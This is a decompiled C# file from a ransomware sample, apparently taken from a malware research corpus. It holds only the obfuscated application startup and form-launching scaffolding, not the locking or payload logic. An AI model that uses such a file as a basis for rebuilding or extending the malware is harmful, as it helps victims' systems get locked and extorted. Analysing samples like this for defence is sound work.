// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Holo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1692AE67-149A-45D4-AB0A-0CA3F19B28FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.btzw-fb43784740363420f3fd853f239a17b4f68de89292e77257010518f48115d3b3.exe

using \u0004;
using \u0005;
using Microsoft.VisualBasic.ApplicationServices;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace \u0005
{
  [GeneratedCode("MyTemplate", "8.0.0.0")]
  [EditorBrowsable(EditorBrowsableState.Never)]
  internal class \u0001 : WindowsFormsApplicationBase
  {
    private static List<WeakReference> \u0001 = new List<WeakReference>();

    [DebuggerNonUserCode]
    static \u0001()
    {
    }

    [DebuggerNonUserCode]
    private static unsafe void \u0001(object _param0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(18);
      lock (\u0001.\u0001)
      {
        *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) (\u0001.\u0001.Count == \u0001.\u0001.Capacity);
        if (*(sbyte*) ((IntPtr) voidPtr + 16) != (sbyte) 0)
          goto label_11;
label_10:
        \u0001.\u0001.Add(new WeakReference(RuntimeHelpers.GetObjectValue(_param0)));
        return;
label_11:
        *(int*) voidPtr = 0;
        IntPtr num1 = (IntPtr) voidPtr + 4;
        *(int*) ((IntPtr) voidPtr + 8) = checked (\u0001.\u0001.Count - 1);
        *(int*) num1 = 0;
        while (true)
        {
          do
          {
            int num2 = *(int*) ((IntPtr) voidPtr + 4);
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 8);
            int num3 = *(int*) ((IntPtr) voidPtr + 12);
            if (num2 > num3)
              goto label_9;
          }
          while (false);
          WeakReference weakReference = \u0001.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
          *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) weakReference.IsAlive;
          if (*(sbyte*) ((IntPtr) voidPtr + 16) != (sbyte) 0)
          {
            *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) (*(int*) ((IntPtr) voidPtr + 4) != *(int*) voidPtr);
            if (*(sbyte*) ((IntPtr) voidPtr + 17) != (sbyte) 0)
              \u0001.\u0001[*(int*) voidPtr] = \u0001.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
            *(int*) voidPtr = checked (*(int*) voidPtr + 1);
          }
          *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
        }
label_9:
        \u0001.\u0001.RemoveRange(*(int*) voidPtr, checked (\u0001.\u0001.Count - *(int*) voidPtr));
        \u0001.\u0001.Capacity = \u0001.\u0001.Count;
        goto label_10;
      }
    }

    [DebuggerHidden]
    [STAThread]
    [EditorBrowsable(EditorBrowsableState.Advanced)]
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    internal static void \u0001(string[] _param0)
    {
      do
      {
        do
        {
          try
          {
            Application.SetCompatibleTextRenderingDefault(WindowsFormsApplicationBase.UseCompatibleTextRendering);
          }
          finally
          {
          }
        }
        while (false);
        \u0001.Application.Run(_param0);
        do
        {
          if (false)
            ;
        }
        while (false);
      }
      while (false);
    }

    [DebuggerStepThrough]
    public \u0001()
      : base(AuthenticationMode.Windows)
    {
      \u0001.\u0001((object) this);
      this.IsSingleInstance = false;
      this.EnableVisualStyles = true;
      this.SaveMySettingsOnExit = true;
      this.ShutdownStyle = ShutdownMode.AfterMainFormCloses;
    }

    [DebuggerStepThrough]
    void WindowsFormsApplicationBase.\u0001() => this.MainForm = (Form) \u0001.Forms.Hol;
  }
}
